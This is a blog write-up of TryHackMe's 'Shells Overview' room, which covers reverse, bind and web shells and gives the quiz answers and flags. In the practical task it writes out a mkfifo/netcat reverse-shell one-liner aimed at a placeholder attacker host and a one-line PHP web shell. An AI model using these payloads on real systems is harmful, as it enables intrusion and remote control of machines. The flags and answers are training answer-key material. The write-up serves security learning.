---
title: Shells Overview | TryHackMe Write-Up
publishDate: '2025-09-15'
description: Learn about the different types of shells.
tags: [tryhackme, shells, writeup]
heroImage: {src: './image.png', alt: 'TryHackMe'}
language: 'en'
---
Here i want to share about my writeup for the room [Shells Overview](https://tryhackme.com/room/shellsoverview), learn about the different types of shells. I wrote this in 2025 and hope it is useful for learning about cybersecurity.

## Task 1: Room Introduction

Shells in cyber security are widely used by attackers to remotely control systems.

In this room, we'll explore different shells, including how to set up and use Reverse and Bind Shells and deploy Web Shells.

The focus is on understanding how shells work without the use of Metasploit or other Frameworks.

Click to complete the task.
>No Answer Needed

## Task 2: Shell Overview

A shell is software that allows a user to interact with an OS.

In cyber security, it commonly refers to a specific shell session an attacker uses when accessing a compromised system, allowing them to run commands, execute software remotely, and perform a wide range of post-exploitation activities.

What is the command-line interface that allows users to interact with an operating system?
>Shell

What process involves using a compromised system as a launching pad to attack other machines in the network?
>Pivoting

What is a common activity attackers perform after obtaining shell access to escalate their privileges?
>Privilege Escalation

## Task 3: Reverse Shell

A reverse shell is a technique where connections initiate from the target system to the attacker's machine, which can help avoid detection from network firewalls.

An attacker uses a tool like Netcat to listen for a connection. A reverse shell payload is then executed on the target, which exposes the shell through the network.

Once executed, the attacker will receive a reverse shell, allowing them to execute commands as if they were logging into a regular terminal.

What type of shell allows an attacker to execute commands remotely after the target connects back?
>Reverse Shell

What tool is commonly used to set up a listener for a reverse shell?
>Netcat

## Task 4: Bind Shell

A bind shell binds a port on the compromised system and listens for a connection. When this connection occurs, it exposes the shell session so the attacker can execute commands remotely.

This method can be used when the compromised target does not allow outgoing connections. On the target, a command is executed to listen for incoming connections; the attacker then uses Netcat to connect and get a shell.

What type of shell opens a specific port on the target for incoming connections from the attacker?
>Bind Shell

Listening below which port number requires root access or privileged permissions?
>1024

## Task 5: Shell Listeners

This text explores tools that can be used as listeners to interact with an incoming reverse shell.

The tools covered are:

- **Rlwrap**: A utility that provides editing keyboard and history.
- **Ncat**: An improved version of Netcat with extra features, like encryption (SSL).
- **Socat**: A utility that allows you to create a socket connection between two data sources.

Which flexible networking tool allows you to create a socket connection between two data sources?
>socat

Which command-line utility provides readline-style editing and command history for programs that lack it, enhancing the interaction with a shell listener?
>rlwrap

What is the improved version of Netcat distributed with the Nmap project that offers additional features like SSL support for listening to encrypted shells?
>ncat

## Task 6: Shell Payloads

A Shell Payload is a command or script that exposes the shell for a reverse or bind shell.

The text provides various reverse shell payloads that can be used in the Linux OS, with examples using:

- Bash
- PHP
- Python
- Telnet
- AWK
- BusyBox

Which Python module is commonly used for managing shell commands and establishing reverse shell connections in security assessments?
>subprocess

What shell payload method in a common scripting language uses the exec, shell_exec, system, passthru, and popen functions to execute commands remotely through a TCP connection?
>PHP

Which scripting language can use a reverse shell by exporting environment variables and creating a socket connection?
>Python

## Task 7: Web Shell

A web shell is a script written in a language supported by a compromised web server that executes commands through the web server itself. It can be hidden within a compromised web application or service, making it difficult to detect.

Web shells can be written in languages like PHP, ASP, and JSP. After the web shell is deployed, it can be accessed through a URL to execute a command and display the result in the web browser.

What vulnerability type allows attackers to upload a malicious script by failing to restrict file types?
>Unrestricted File Upload

What is a malicious script uploaded to a vulnerable web application to gain unauthorized access?
>Web Shell

## Task 8: Practical Task

To test our knowledge, let's get the flag from the vulnerable web server by clicking the Start Machine button.

The challenge will be accessible on the following URLs:

- `[MACHINE_IP]:8081` hosts the web application that is vulnerable to command injection.
- `[MACHINE_IP]:8082` hosts the web application that is vulnerable to an unrestricted file upload.

Using a reverse or bind shell, exploit the command injection vulnerability to get a shell. What is the content of the flag saved in the / directory?

First, we can run `nc -lnvp 4444`.

And then, open a new terminal and run this command to know what IP we have: `ip addr show tun0`

Open the browser, go to `[MACHINE_IP]:8080`, and click "Reverse/Bind Shell Tank".

And then, you can fill the input field** with this reverse shell command `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`

And then, our listener will get a connection and we can get the flag.

> THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}

Using a web shell, exploit the unrestricted file upload vulnerability and get a shell. What is the content of the flag saved in the / directory?

We can go to `[MACHINE_IP]:8082`.

And then, we can create a file named `shell.php` with this script:

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Keep the listener running on port 4444.

We can upload the `shell.php` file to the website until **the upload is successful**.

And then, go to this URL `[MACHINE_IP]:8082/uploads/shell.php?cmd=cat%20/flag.txt` and we get the flag.

>THM{202bb14ed12120b31300cfbbbdd35998786b44e5}

## Task 9: Conclusion

Reverse Shells establish a connection from a compromised machine back to an attacker's system. Bind Shells listen for incoming connections on a compromised machine, and Web Shells offer attackers a unique avenue for exploiting vulnerabilities in web applications.
>No Answer Needed
